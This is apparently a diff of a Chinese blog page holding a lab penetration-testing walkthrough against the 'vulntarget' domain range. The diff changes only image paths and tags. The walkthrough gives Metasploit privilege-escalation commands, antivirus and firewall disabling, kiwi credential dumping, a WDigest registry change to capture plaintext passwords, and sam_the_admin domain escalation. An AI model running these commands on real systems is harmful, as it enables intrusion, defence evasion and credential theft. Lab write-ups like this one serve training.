 <p>使用cve_2021_1732_win32k来提权，建议多试几次</p>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/local/cve_2021_1732_win32k<br><span class="hljs-keyword">set</span> session <span class="hljs-comment">5</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 10.0.20.30</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 5555</span><br>run<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/jJEleGzPqMrtwFK.png" srcset="/img/loading.gif" lazyload alt="image-20220517145605676"></p>
+<p><img src="https://s2.loli.net/2022/08/08/jJEleGzPqMrtwFK.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517145605676"></p>
 <p><strong>进程迁移</strong></p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">run</span><span class="language-bash"> post/windows/manage/migrate</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/FrLWyhHbpPKD4il.png" srcset="/img/loading.gif" lazyload alt="image-20220517150731131"></p>
+<p><img src="https://s2.loli.net/2022/08/08/FrLWyhHbpPKD4il.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517150731131"></p>
 <p><strong>关闭杀毒软件</strong></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> killav<br></code></pre></td></tr></table></figure>
 
 <p><strong>关闭休眠和防火墙</strong></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">shell<br>chcp 65001<br>powercfg -h off<br>netsh<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">set</span> opmode <span class="hljs-attribute">mode</span>=disable<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/38f3ce6f6d0c42c9b6118e446ca3a03f.png" srcset="/img/loading.gif" lazyload alt="image-20220517145939511"></p>
+<p><img src="https://img-blog.csdnimg.cn/38f3ce6f6d0c42c9b6118e446ca3a03f.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517145939511"></p>
 <h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/5ffbd4de951e427abf52e2cfbec5f079.png" srcset="/img/loading.gif" lazyload alt="image-20220517150051406"></p>
-<p><img src="https://img-blog.csdnimg.cn/592750492efb44d4aa7283634f178663.png" srcset="/img/loading.gif" lazyload alt="image-20220517150116317"></p>
+<p><img src="https://img-blog.csdnimg.cn/5ffbd4de951e427abf52e2cfbec5f079.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517150051406"></p>
+<p><img src="https://img-blog.csdnimg.cn/592750492efb44d4aa7283634f178663.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517150116317"></p>
 <p>获得域名vulntarget.com和域内网段10.0.10.99&#x2F;24</p>
 <p><strong>查找域控</strong></p>
 <p>msf查找域控命令<code>run post/windows/gather/enum_domain</code>导致会话断开，所以手动查找域控</p>
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net <span class="hljs-built_in">time</span> /<span class="hljs-built_in">domain</span> <span class="hljs-comment">//获取域控时间和用户名</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/1e99c96895644b62a9c1fc66b05109c3.png" srcset="/img/loading.gif" lazyload alt="image-20220517150336491"></p>
+<p><img src="https://img-blog.csdnimg.cn/1e99c96895644b62a9c1fc66b05109c3.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517150336491"></p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nslookup WIN-UH20PRD3EAO<span class="hljs-selector-class">.vulntarget</span><span class="hljs-selector-class">.com</span> <span class="hljs-comment">//查找域控IP</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/b5db34a8bd6f4aea847a8677d2abb7c8.png" srcset="/img/loading.gif" lazyload alt="image-20220517150417219"></p>
+<p><img src="https://img-blog.csdnimg.cn/b5db34a8bd6f4aea847a8677d2abb7c8.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517150417219"></p>
 <p><strong>收集域成员信息</strong></p>
 <p>这里需要域成员登录过，否则拿不到域成员账号</p>
 <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span><br><span class="hljs-attribute">creds_all</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/9ea87fabe0ac4469a090d31a83e41a93.png" srcset="/img/loading.gif" lazyload alt="image-20220517151220153"></p>
+<p><img src="https://img-blog.csdnimg.cn/9ea87fabe0ac4469a090d31a83e41a93.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517151220153"></p>
 <p>发现没有密码只有hash，这一直接爆破md5，也可以修改注册表，强制用户重新登陆。</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.somd5.com/</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/60d86edff07f42ecb9a6b84768472c2e.png" srcset="/img/loading.gif" lazyload alt="image-20220517151500131"></p>
+<p><img src="https://img-blog.csdnimg.cn/60d86edff07f42ecb9a6b84768472c2e.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517151500131"></p>
 <p><strong>开启Wdigest Auth服务</strong></p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></code></pre></td></tr></table></figure>
 
@@ -602,7 +602,7 @@
 <figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ru<span class="hljs-symbol">ndll32</span> user<span class="hljs-number">32.</span>dll,LockWorkStatio<span class="hljs-symbol">n</span><br></code></pre></td></tr></table></figure>
 
 <p>等待登录，重新抓取，得到密码</p>
-<p><img src="https://img-blog.csdnimg.cn/041d3475e3264922a7910ad553e38ea9.png" srcset="/img/loading.gif" lazyload alt="image-20220517152141939"></p>
+<p><img src="https://img-blog.csdnimg.cn/041d3475e3264922a7910ad553e38ea9.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517152141939"></p>
 <p><strong>关闭Wdigest Auth服务</strong></p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure>
 
@@ -611,7 +611,7 @@
 <p>域内提权</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">proxychains <span class="hljs-keyword">python3</span> sam_the_admin.<span class="hljs-keyword">py</span> <span class="hljs-string">&quot;vulntarget.com/win101:admin#123&quot;</span> -dc-ip <span class="hljs-number">10.0</span>.<span class="hljs-number">10.100</span> -<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/976d3ec02c504af58542f4ab064cd26e.png" srcset="/img/loading.gif" lazyload alt="image-20220517153918516"></p>
+<p><img src="https://img-blog.csdnimg.cn/976d3ec02c504af58542f4ab064cd26e.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517153918516"></p>
 <p>system权限到手。</p>
 
                 
@@ -653,9 +653,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E9%9D%B6%E5%9C%BA/" class="print-no-link">#靶场</a>
-      
         <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/" class="print-no-link">#靶场</a>
       
     </div>
   
